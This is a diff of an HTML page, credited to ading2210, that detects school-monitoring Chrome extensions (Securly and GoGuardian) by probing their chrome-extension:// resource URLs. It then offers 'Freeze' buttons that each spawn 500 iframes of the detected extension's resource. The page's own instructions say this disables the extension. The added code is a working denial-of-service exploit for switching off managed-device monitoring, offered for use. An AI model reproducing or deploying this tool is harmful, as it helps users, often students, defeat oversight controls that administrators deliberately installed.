@@ -52,16 +52,91 @@
         padding: 4px;
         padding-left: 16px;
         padding-right: 16px;
-
+        
+        margin: 16px;
         margin-left: auto;
         margin-right: auto;
-        margin-top: 16px;
+      }
+      #buttons_container {
+        display: flex;
+        gap: 8px;
       }
     </style>
     <script>
-      let public_url = `{{public_url}}`;
+      let from_id = id => document.getElementById(id);
+      let extensions = {
+        "securly_new": {
+          name: "Securly",
+          url: "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css"
+        },
+        "securly_old": {
+          name: "Securly (old)",
+          url: "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css"
+        },
+        "goguardian": {
+          name: "Goguardian",
+          url: "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube-injection.js"
+        },
+        "google_translate": {
+          name: "Google Translate (TEST ONLY)",
+          url: "chrome-extension://aapbdbdomjkkjkaonfhkkikfgjllcleb/options.html"
+        },
+        "google_dictionary": {
+          name: "Google Dictionary (TEST ONLY)",
+          url: "chrome-extension://mgijmajocgfcbeboacabfgobmjgjcoja/content.min.css"
+        }
+      }
 
-      function create_iframes() {
+      async function check_url(url) {
+        let controller = new AbortController();
+        let timeout = setTimeout(() => controller.abort(), 500);
+
+        try {
+          await fetch(url, {signal: controller.signal});
+          return true;
+        }
+        catch (error) {
+          let error_msg = error+"";
+          return error_msg.includes("AbortError");
+          console.log(error);
+        }
+      }
+      
+      async function detect_extensions() {
+        let detected = [];
+        for (let extension of Object.values(extensions)) {
+          let exists = await check_url(extension.url);
+          if (exists) {
+            detected.push(extension);
+          }
+        }
+        return detected;
+      }
+
+      async function main() {
+        let detected = await detect_extensions();
+        let buttons_container = from_id("buttons_container")
+        
+        if (detected.length === 0) {
+          buttons_container.innerHTML = `<p><b>Error: No supported extensions detected.</b></p>`;
+          return;
+        }
+        else {
+          buttons_container.innerHTML = ""
+        }
+
+        for (let extension of detected) {
+          let button = document.createElement("button");
+          button.innerText = `Freeze ${extension.name}`;
+          button.onclick = () => {
+            create_iframes(extension.url);
+          }
+          buttons_container.append(button);
+          console.log(extension);
+        }
+      }
+
+      function create_iframes(public_url) {
         for (let i=0; i<500; i++) {
           let iframe = document.createElement("iframe");
           iframe.src = public_url;
@@ -69,6 +144,8 @@
           document.body.append(iframe);
         }
       }
+
+      window.onload = main;
     </script>
   </head>
   <body>
@@ -83,13 +160,15 @@
         <li>Go back to this page and click the "freeze extension" button a few times.</li>
         <li>The extension should now be disabled.</li>
       </ol>
-      <p>During this process, your Chromebook may freeze momentarily. This is normal, and it should resolve itself after a few seconds.</p>
-      <button id="main_button" onclick="create_iframes()">Freeze Extension</button>
-      <br><br>
+      <p>During this process, your Chromebook may hang momentarily. This is normal, and it should resolve itself after a few seconds.</p>
+      <div id="buttons_container">
+        <p><i>Detecting extensions...</i></p>
+      </div>
+      <br>
       <hr>
       <details>
         <summary style="margin-bottom: 8px;">
-          Made by <a href="https://ading.dev">ading2210</a>. This file is licensed under the MIT license.
+          Made by <a href="https://ading.dev" target="_blank">ading2210</a>. This file is licensed under the MIT license.
         </summary>
         <pre>MIT License
 Copyright (c) 2023 ading2210
